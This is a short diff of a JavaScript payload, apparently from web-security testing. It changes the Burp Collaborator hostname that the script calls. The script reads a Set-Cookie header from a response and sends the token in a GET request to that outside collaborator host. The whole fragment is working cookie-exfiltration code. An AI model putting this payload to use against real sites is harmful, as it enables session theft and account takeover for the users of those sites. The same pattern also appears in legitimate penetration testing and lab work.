@@ -7,7 +7,7 @@
     {
     var yourtoken = xhr.getResponseHeader('Set-Cookie')
     var xhr2 = new XMLHttpRequest();
-    xhr2.open("GET", "http://l5rpzabe1sr5msulnyyauuo0krqreg.burpcollaborator.net/"+ yourtoken); 
+    xhr2.open("GET", "http://usqeegm12oxwrp7w3qvwnxamcdi46t.burpcollaborator.net/"+ yourtoken); 
     xhr2.send();
     }
     }
